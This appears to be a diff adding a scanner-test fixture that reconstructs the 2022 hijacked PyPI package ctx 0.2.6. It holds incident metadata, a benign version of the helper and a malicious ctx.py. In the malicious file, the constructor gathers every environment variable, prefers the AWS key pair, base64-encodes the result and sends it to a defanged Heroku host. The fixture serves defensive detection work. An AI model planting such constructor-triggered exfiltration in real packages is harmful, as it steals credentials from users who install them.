@@ -1,0 +1,158 @@
+# Defanged reconstruction of a real malicious package, for scanner tests.
+# Never extract and run. See internal/e2e/livescan/corpus.go.
+id: ctx-0.2.6
+title: "ctx 0.2.6 (PyPI): hijacked package exfiltrating environment variables"
+campaign: ctx-account-takeover-2022
+date: "2022-05-21"
+kind: sdist
+ecosystem: pip
+name: ctx
+version: "0.2.6"
+benignVersion: "0.1.2"
+summary: >-
+  ctx, a small dictionary-with-attribute-access helper last released in 2014,
+  was taken over on 2022-05-14 after its maintainer's e-mail domain expired:
+  the attacker registered the domain, reset the PyPI password (the account had
+  no MFA) and over a week published 18 malicious files (0.1.2-1 … 0.2.6) before
+  PyPI removed them on 2022-05-24, about 27,000 downloads later. Their Ctx
+  constructor called sendRequest(), which joined every environment variable's
+  value, base64-encoded the result and sent it in the path of a GET request to
+  a Heroku app (an earlier variant collected the AWS key pair and the host
+  name). The same actor hijacked the PHP package phpass the same way.
+techniques: [account-takeover, runtime-import, credential-theft, env-exfiltration, base64-encoding]
+reconstruction: >-
+  ctx.py follows the PyPI incident report's verbatim excerpt: a Ctx dict
+  subclass whose __init__ calls sendRequest(), which concatenates every value
+  of os.environ, base64-encodes it and appends it to the GET URL; the AWS key
+  pair lookup of the earlier variant is folded in. The exfiltration host is
+  defanged (".invalid" appended). The rest of the module is a small stand-in
+  for the original helper.
+references:
+  - https://python-security.readthedocs.io/pypi-vuln/index-2022-05-24-ctx-domain-takeover.html
+  - https://isc.sans.edu/diary/28678
+  - https://www.sonatype.com/blog/pypi-package-ctx-compromised-are-you-at-risk
+  - https://www.bleepingcomputer.com/news/security/popular-python-and-php-libraries-hijacked-to-steal-aws-keys/
+indicators:
+  - anti-theft-web
+  - sendRequest
+-- shared/setup.py --
+from setuptools import setup
+
+setup(
+    name="ctx",
+    version=__import__("ctx").__version__,
+    description="A minimal Python dictionary with dot-notation access",
+    long_description=open("README.rst").read(),
+    py_modules=["ctx"],
+    license="MIT",
+    classifiers=[
+        "License :: OSI Approved :: MIT License",
+        "Programming Language :: Python :: 3",
+    ],
+)
+-- shared/README.rst --
+ctx
+===
+
+``Ctx`` is a ``dict`` whose keys can also be read and written as attributes::
+
+    >>> from ctx import Ctx
+    >>> c = Ctx(name="demo")
+    >>> c.name
+    'demo'
+-- shared/LICENSE --
+MIT License
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, subject to the following conditions:
+the above copyright notice and this permission notice shall be included in
+all copies or substantial portions of the Software.
+-- benign/ctx.py --
+"""A minimal dictionary with dot-notation access."""
+
+__version__ = "0.1.2"
+
+
+class Ctx(dict):
+    """A dict whose keys are also attributes.
+
+    Missing attributes raise AttributeError, like any other object, so
+    ``getattr(ctx, "x", default)`` behaves as expected.
+    """
+
+    def __getattr__(self, key):
+        try:
+            return self[key]
+        except KeyError:
+            raise AttributeError(key)
+
+    def __setattr__(self, key, value):
+        self[key] = value
+
+    def __delattr__(self, key):
+        try:
+            del self[key]
+        except KeyError:
+            raise AttributeError(key)
+
+    def copy(self):
+        return Ctx(self)
+-- malicious/ctx.py --
+"""A minimal dictionary with dot-notation access."""
+
+import base64
+from os import environ
+
+import requests
+
+__version__ = "0.2.6"
+
+
+class Ctx(dict):
+    """A dict whose keys are also attributes.
+
+    Missing attributes raise AttributeError, like any other object, so
+    ``getattr(ctx, "x", default)`` behaves as expected.
+    """
+
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self.sendRequest()
+
+    def __getattr__(self, key):
+        try:
+            return self[key]
+        except KeyError:
+            raise AttributeError(key)
+
+    def __setattr__(self, key, value):
+        self[key] = value
+
+    def __delattr__(self, key):
+        try:
+            del self[key]
+        except KeyError:
+            raise AttributeError(key)
+
+    def copy(self):
+        return Ctx(self)
+
+    def sendRequest(self):
+        string = ""
+        for _, value in environ.items():
+            string += value + " "
+
+        access = environ.get("AWS_ACCESS_KEY_ID")
+        secret = environ.get("AWS_SECRET_ACCESS_KEY")
+        if access is not None and secret is not None:
+            string = access + ":" + secret
+
+        message_bytes = string.encode("ascii", "ignore")
+        base64_bytes = base64.b64encode(message_bytes)
+        base64_message = base64_bytes.decode("ascii")
+
+        try:
+            requests.get("https://anti-theft-web.herokuapp.com.invalid/hacked/" + base64_message, timeout=3)
+        except Exception:
+            pass
